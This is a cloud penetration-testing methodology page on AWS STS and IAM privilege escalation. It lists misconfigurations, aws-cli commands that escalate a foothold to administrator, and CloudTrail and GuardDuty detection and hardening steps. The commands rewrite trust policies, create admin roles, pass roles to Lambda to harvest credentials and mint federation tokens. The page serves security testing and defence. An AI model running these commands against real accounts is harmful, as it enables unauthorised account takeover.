---
cstg_id: CSTG-AWS-STS-PRIVESC
title: "AWS Sts - Privilege Escalation"
provider: aws
service: sts
phase: privilege-escalation
required_access: assumed-breach
required_permissions: [sts:AssumeRole, sts:GetFederationToken, sts:GetSessionToken, iam:PassRole, iam:CreateRole, iam:UpdateAssumeRolePolicy, iam:AttachRolePolicy, iam:PutRolePolicy, iam:CreatePolicyVersion]
tools: [aws-cli, pacu, PMapper, cloudsplaining, enumerate-iam]
references: ["https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html", "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_permissions-boundaries.html", "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/", "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"]
license: CC BY-SA 4.0
---

## Summary

STS is the execution engine for most IAM privilege-escalation paths in AWS. The escalation rarely lies in STS itself; instead an over-permissioned principal manipulates IAM (creating roles, editing trust or permission policies, passing roles to compute) and then calls `sts:AssumeRole` to *materialise* the higher privilege as a usable credential. This page enumerates the permission-driven paths that culminate in an STS call, plus the STS-native credential-minting verbs (`GetFederationToken`, `GetSessionToken`) and the trust-policy backdoor that converts "can edit a role" into "can become that role."

The attacker objective is to move from a limited foothold principal to a principal with materially greater privilege (ideally administrator) within the same account, by obtaining temporary credentials for a more powerful role or by attaching/expanding policies and then assuming or re-using the resulting identity.

## Prerequisites

- An assumed-breach foothold: valid credentials for some principal (IAM user keys, an instance/container/Lambda role, or an existing role session).
- One or more of the IAM/STS permissions listed in `required_permissions`. Each `### <permission>` subsection below states exactly which permission unlocks the path.
- Knowledge of target roles and their trust policies, obtained during [AWS STS - Enumeration](../02-services/aws-sts-enum.md).

## Enumeration

```bash
# Who am I, and what may I assume
aws sts get-caller-identity
aws iam simulate-principal-policy \
  --policy-source-arn <my-arn> \
  --action-names sts:AssumeRole iam:PassRole iam:CreateRole \
                 iam:UpdateAssumeRolePolicy iam:AttachRolePolicy iam:PutRolePolicy

# Find roles whose trust lets me in, and roles more privileged than me
aws iam get-account-authorization-details > authz.json
aws iam list-roles --query 'Roles[].{Name:RoleName,Trust:AssumeRolePolicyDocument}'

# Identify privileged roles worth targeting
aws iam list-attached-role-policies --role-name TARGET
```

Automated graph analysis (PMapper, cloudsplaining) ingests `authz.json` and computes which principals can reach administrator through any chain of the verbs below.

## Misconfigurations & Findings

- **`iam:PassRole` paired with a compute-creation verb** (`lambda:CreateFunction`, `ec2:RunInstances`, `glue:CreateDevEndpoint`, `cloudformation:CreateStack`, `sagemaker:CreateNotebookInstance`, etc.) without a `iam:PassedToService` / resource constraint - lets the principal hand a powerful role to a service it controls and harvest the role's STS credentials.
- **`iam:UpdateAssumeRolePolicy` on a privileged role** - the principal rewrites the role's trust policy to trust itself, then assumes it. The single most direct STS-backed escalation.
- **`iam:CreateRole` + `iam:AttachRolePolicy`/`iam:PutRolePolicy`** - create a brand-new role trusting self, attach `AdministratorAccess`, assume it.
- **`iam:CreatePolicyVersion` / `iam:SetDefaultPolicyVersion`** - silently expand an already-attached policy to `*:*`.
- **`sts:AssumeRole` permitted against an over-broad trust** (`Principal: account-root` with no condition) - lateral/vertical movement with no IAM edit required.
- **`sts:GetFederationToken` on an admin-equivalent user** - mint federated credentials; note these are bounded by the *intersection* of the user's policy and the passed session policy, but a powerful user yields powerful federated tokens.
- **Permissions boundaries / SCPs absent**, so privileged verbs are not capped.

## Exploitation

### sts:AssumeRole

If a more-privileged role's trust policy already lists the current principal (or `account-root`), escalation is a single call - no IAM edit, low noise:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/AdminRole \
  --role-session-name s

export AWS_ACCESS_KEY_ID=...      # from Credentials
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity        # now the AdminRole
```

### iam:UpdateAssumeRolePolicy

Rewrite a privileged role's trust to point at yourself, then assume it:

```bash
cat > trust.json <<'EOF'
{ "Version":"2012-10-17","Statement":[{"Effect":"Allow",
  "Principal":{"AWS":"arn:aws:iam::123456789012:user/foothold"},
  "Action":"sts:AssumeRole"}] }
EOF
aws iam update-assume-role-policy --role-name AdminRole --policy-document file://trust.json
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name s
```

### iam:CreateRole

Combined with a policy-attach verb, fabricate an admin role you can assume:

```bash
aws iam create-role --role-name pwn --assume-role-policy-document file://trust.json
aws iam attach-role-policy --role-name pwn \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/pwn --role-session-name s
```

### iam:PassRole

`PassRole` is not directly callable; it gates handing a role to a service. The STS credentials of the passed role are then retrieved from the service you launched. Example via Lambda:

```bash
# 'victim-role' is more privileged than the caller
aws lambda create-function --function-name x --runtime python3.12 \
  --role arn:aws:iam::123456789012:role/victim-role \
  --handler i.h --zip-file fileb://f.zip
# Function code calls sts:GetCallerIdentity / harvests its own role creds and exfils them
```

Equivalent paths exist via `ec2:RunInstances` (read the new instance's IMDS role credentials), `glue`, `cloudformation`, `datapipeline`, `sagemaker`, and `codebuild`.

### iam:AttachRolePolicy / iam:PutRolePolicy

Attach administrator (or an inline `*:*` statement) to a role the caller can already assume, then re-assume to pick up the new rights:

```bash
aws iam attach-role-policy --role-name AssumableRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AssumableRole --role-session-name s
```

### iam:CreatePolicyVersion

Expand a managed policy already attached to the caller's role/user to full access, no STS edit needed but often combined with re-assumption:

```bash
aws iam create-policy-version --policy-arn arn:aws:iam::123456789012:policy/limited \
  --policy-document file://admin.json --set-as-default
```

### sts:GetFederationToken

Mint a federated session. The session is the intersection of the calling user's permissions and the supplied policy - so a high-privilege user produces high-privilege federated credentials, useful for laundering activity under a `federated-user` identity:

```bash
aws sts get-federation-token --name f \
  --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

### sts:GetSessionToken

Derives temporary credentials (commonly to satisfy MFA-gated flows). On its own it does not raise privilege, but it converts long-term keys into a temporary session that inherits the user's full rights and can be chained into the paths above.

## Detection & Logging

- **CloudTrail** captures the IAM mutation (`UpdateAssumeRolePolicy`, `CreateRole`, `AttachRolePolicy`, `PutRolePolicy`, `CreatePolicyVersion`, `SetDefaultPolicyVersion`) followed shortly by `sts:AssumeRole` for the same target role - a high-fidelity escalation signature, especially when the assuming principal just edited the trust.
- `iam:PassRole` does not emit its own event; detect it via the downstream `lambda:CreateFunction` / `ec2:RunInstances` event whose `requestParameters` carries a role more privileged than the caller, followed by the role's credentials appearing from a new source (`InstanceCredentialExfiltration`).
- `sts:GetFederationToken` / `GetSessionToken` events with broad inline session policies, or `AssumeRole` events whose target role was created seconds earlier.
- Managed detections: **GuardDuty** `PrivilegeEscalation:IAMUser/AdministrativePermissions`, `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.*`, and CloudTrail anomaly findings. IAM Access Analyzer flags newly over-broad trust policies.

## Remediation & Hardening

- Never grant `iam:PassRole` without an `iam:PassedToService` condition and a tightly scoped `Resource`; never grant `iam:CreateRole`, `iam:*RolePolicy`, `iam:UpdateAssumeRolePolicy`, or `iam:CreatePolicyVersion` to non-administrative principals.
- Attach **permissions boundaries** to all delegated/CI principals so created or assumed roles cannot exceed the boundary.
- Use **SCPs** to deny trust-policy edits and role creation outside a dedicated identity OU, and to restrict `sts:AssumeRole` targets.
- Scope role trust policies to explicit principals with conditions (`aws:MultiFactorAuthPresent`, `sts:ExternalId`, `aws:SourceArn`).
- Run PMapper/cloudsplaining in CI to fail builds that introduce an escalation edge; alert on the CloudTrail mutation-then-assume sequence.

## Tools

- **aws-cli** - executes every step above.
- **Pacu** - `iam__privesc_scan` automates discovery and exploitation of these paths.
- **PMapper** - graph model that proves reachability to admin via these verbs.
- **cloudsplaining** - flags policies granting the dangerous IAM verbs.
- **enumerate-iam** - confirms which of the gating permissions the foothold holds.

## References

- AWS STS AssumeRole API - https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html
- IAM permissions boundaries - https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_permissions-boundaries.html
- Rhino Security Labs - AWS privilege escalation methods and mitigation - https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- hackingthe.cloud - IAM privilege escalation - https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/
